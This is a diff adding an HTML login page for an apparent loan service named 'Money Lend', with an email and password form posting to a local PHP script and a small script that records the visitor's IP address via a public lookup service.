@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Money Lend</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>Money Lend</h1>
+            <ul>
+                <li>Success Loans & Credit in Minutes</li>
+                <li><img src="images/check.png" alt="Check" class="check-icon"> Loans up to ₹2,00,000 in 2 minutes</li>
+                <li><img src="images/check.png" alt="Check" class="check-icon"> Available to use across India</li>
+            </ul>
+        </div>
+        <div class="right">
+            <h2>Welcome back!</h2>
+            <h3>Please login to access your account.</h3>
+
+            <!-- Login Form -->
+            <form action="2login.php" method="POST">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+
+                <!-- Hidden input for IP address -->
+                <input type="hidden" name="user_ip" id="user_ip" value="">
+
+                <button type="submit">Login</button>
+            </form>
+
+            <p>Don't have an account? <a href="log_user1.php" id="create-account-link">Create</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Get the user's IP address using JavaScript
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('user_ip').value = data.ip;
+                document.getElementById('create-account-link').href = `log_user1.php?create_account=true&user_ip=${data.ip}`;
+            });
+    </script>
+</body>
+</html>
